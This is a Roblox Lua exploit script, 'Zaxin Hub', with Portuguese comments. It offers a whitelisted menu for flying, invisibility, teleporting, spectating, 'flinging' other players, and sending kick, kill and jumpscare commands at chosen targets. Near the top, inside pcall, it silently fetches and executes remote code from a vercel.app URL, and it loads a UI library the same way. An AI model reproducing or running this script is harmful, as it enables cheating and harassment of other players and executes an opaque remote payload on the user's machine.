--// SERVIÇOS
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera
local UserInputService = game:GetService("UserInputService")

--// NOME FIXO
local HUB_NAME = "Zaxin Hub"

--// EXECUTA O LOAD EXTERNO
pcall(function()
    loadstring(game:HttpGet("https://scriptsbinsauth.vercel.app/api/scripts/917fb298-61be-4615-9d7c-0e5b769b7360/raw"))()
end)

--// WHITELIST (Acesso Total: 10pereirazzk)
local WhiteList = {
    ["fh_user1"] = "Owner",
    ["Zelaojg"] = "Parceiro",
    ["joaoluizzx"] = "Staff",
    ["itz_starUwUspice"] = "Usuário-Admin",
    ["tiai200"] = "Usuário-Admin",
    ["10pereirazzk"] = "Owner/Developer/Admin",
    [LocalPlayer.Name] = "Developer"
}

--// VARIÁVEIS DE CONTROLE
local flying = false
local flySpeed = 50
local flyConn
local selecionado = nil

--// FUNÇÃO FLY (SISTEMA CFRAME - NÃO TRAVA)
local function StopFly()
    flying = false
    if flyConn then flyConn:Disconnect() flyConn = nil end
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
        LocalPlayer.Character.Humanoid.PlatformStand = false
    end
end

local function StartFly()
    StopFly()
    flying = true
    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local root = char:WaitForChild("HumanoidRootPart")
    
    flyConn = RunService.RenderStepped:Connect(function(dt)
        if not flying or not root then return end
        root.Velocity = Vector3.new(0,0,0)
        
        local moveDir = Vector3.new(0,0,0)
        local camCF = Camera.CFrame
        
        if UserInputService:IsKeyDown(Enum.KeyCode.W) then moveDir = moveDir + camCF.LookVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.S) then moveDir = moveDir - camCF.LookVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.A) then moveDir = moveDir - camCF.RightVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.D) then moveDir = moveDir + camCF.RightVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.Space) then moveDir = moveDir + Vector3.new(0,1,0) end
        if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then moveDir = moveDir + Vector3.new(0,-1,0) end
        
        if moveDir.Magnitude > 0 then
            root.CFrame = root.CFrame + (moveDir.Unit * flySpeed * dt)
        end
    end)
end

--// FUNÇÃO FLING (ARREMESSAR ALVO)
local function FlingTarget(targetName)
    local target = Players:FindFirstChild(targetName)
    local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if target and target.Character and root then
        local tRoot = target.Character:FindFirstChild("HumanoidRootPart")
        local oldCF = root.CFrame
        local bva = Instance.new("BodyAngularVelocity", root)
        bva.AngularVelocity = Vector3.new(0, 999999, 0)
        bva.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
        
        local start = tick()
        local conn
        conn = RunService.Heartbeat:Connect(function()
            if tick() - start > 1.3 or not tRoot then
                conn:Disconnect() bva:Destroy() root.CFrame = oldCF return
            end
            root.CFrame = tRoot.CFrame * CFrame.new(math.random(-1,1), 0, math.random(-1,1))
        end)
    end
end

--// ENVIAR COMANDO CHAT
local function EnviarComando(comando, alvo)
    local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]
    if canal then
        canal:SendAsync(";" .. comando .. " " .. (alvo or ""))
    end
end

--// INTERFACE WINDUI (ZAXIN HUB)
if WhiteList[LocalPlayer.Name] then
    local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
    local Window = WindUI:CreateWindow({
        Title = HUB_NAME,
        Icon = "shield",
        Author = "by: ZaxinX",
        Size = UDim2.fromOffset(580, 500),
        Transparent = true
    })

    -- ABA SELF
    local TabSelf = Window:Tab({ Title = "Self", Icon = "user" })
    local SecSet = TabSelf:Section({ Title = "Configurações (Digite e Enter)" })

    SecSet:Input({
        Title = "Velocidade do Fly",
        Placeholder = "Digite número...",
        Callback = function(t) flySpeed = tonumber(t) or flySpeed end
    })

    SecSet:Input({
        Title = "Gravidade do Mapa",
        Placeholder = "Digite número...",
        Callback = function(t) workspace.Gravity = tonumber(t) or workspace.Gravity end
    })

    TabSelf:Toggle({Title = "Ativar Fly", Callback = function(s) if s then StartFly() else StopFly() end end})
    TabSelf:Toggle({Title = "Invisibilidade FE", Callback = function(s)
        for _, v in pairs(LocalPlayer.Character:GetDescendants()) do
            if v:IsA("BasePart") or v:IsA("Decal") then v.Transparency = s and 1 or 0 end
        end
    end})

    -- ABA ADMIN
    local TabAdmin = Window:Tab({ Title = "Admin", Icon = "terminal" })
    local SecAd = TabAdmin:Section({ Title = "Controle de Jogadores" })

    SecAd:Dropdown({
        Title = "Selecionar Alvo",
        Values = (function() local t = {} for _,p in pairs(Players:GetPlayers()) do table.insert(t, p.Name) end return t end)(),
        Callback = function(v) selecionado = v end
    })

    SecAd:Button({Title = "FLING (ARREMESSAR)", Callback = function() if selecionado then FlingTarget(selecionado) end end})
    SecAd:Button({Title = "KICK (EXPULSAR)", Callback = function() if selecionado then EnviarComando("kick", selecionado) end end})
    SecAd:Button({Title = "KILL (MATAR)", Callback = function() if selecionado then EnviarComando("kill", selecionado) end end})
    SecAd:Button({Title = "TP ATÉ ELE", Callback = function() if selecionado then LocalPlayer.Character.HumanoidRootPart.CFrame = Players[selecionado].Character.HumanoidRootPart.CFrame end end})
    SecAd:Button({Title = "VIEW", Callback = function() if selecionado then Camera.CameraSubject = Players[selecionado].Character.Humanoid end end})
    SecAd:Button({Title = "UNVIEW", Callback = function() Camera.CameraSubject = LocalPlayer.Character.Humanoid end})

    -- ABA EFEITOS (JUMPSCARES)
    local TabJump = Window:Tab({ Title = "Efeitos", Icon = "zap" })
    local SecJump = TabJump:Section({ Title = "Jumpscares" })

    local jComands = {"jumps1", "jumps2", "jumps3", "jumps4"}
    for _, j in ipairs(jComands) do
        SecJump:Button({
            Title = j:upper(),
            Callback = function() if selecionado then EnviarComando(j, selecionado) end end
        })
    end
end

--// SOM DE CARREGAMENTO
local s = Instance.new("Sound", workspace)
s.SoundId = "rbxassetid://8486683243"
s.Volume = 2
s:Play()
game.Debris:AddItem(s, 3)

--// ÚLTIMA LINHA ALTERADA COMO PEDIDO
print("Zaxin Hub")
